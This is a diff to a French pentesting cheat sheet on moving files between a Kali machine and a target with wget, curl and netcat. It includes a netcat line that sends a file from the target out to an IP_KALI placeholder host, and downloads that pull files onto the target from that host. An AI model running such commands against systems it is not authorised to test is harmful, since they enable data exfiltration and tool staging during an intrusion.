@@ -20,11 +20,12 @@ date: 2025-11-26T16:38:12+01:00
 - Sur **la cible** (recevoir) :
 
   ```bash
+  cd /chemin/du/fichier
   wget http://IP_KALI:8000/fichier
   # ou
   curl -O http://IP_KALI:8000/fichier
   ```
-
+  
   ------
 
 ### Cible → Kali
@@ -39,11 +40,13 @@ date: 2025-11-26T16:38:12+01:00
 - Sur **Kali** (recevoir) :
 
   ```bash
+  cd /chemin/du/fichier
+  
   wget http://IP_CIBLE:8000/fichier
   # ou
   curl -O http://IP_CIBLE:8000/fichier
   ```
-
+  
   ------
 
 ## Transfert via Netcat (nc)
@@ -55,15 +58,17 @@ date: 2025-11-26T16:38:12+01:00
 - Sur **la cible** (recevoir) :
 
   ```bash
+  cd /chemin/du/fichier
   nc -lnvp 4444 > fichier_recu
   ```
 
 - Sur **Kali** (envoyer) :
 
   ```bash
+  cd /chemin/du/fichier
   nc IP_CIBLE 4444 < fichier_a_envoyer
   ```
-
+  
   ------
 
 ### **Cible → Kali**
@@ -71,15 +76,17 @@ date: 2025-11-26T16:38:12+01:00
 - Sur **Kali** (recevoir) :
 
   ```bash
+  cd /chemin/du/fichier
   nc -lnvp 4444 > fichier_recu
   ```
 
 - Sur **la cible** (envoyer) :
 
   ```bash
+  cd /chemin/du/fichier
   nc IP_KALI 4444 < fichier_a_envoyer
   ```
-
+  
   ------
 
 ##  **Résumé en une phrase**
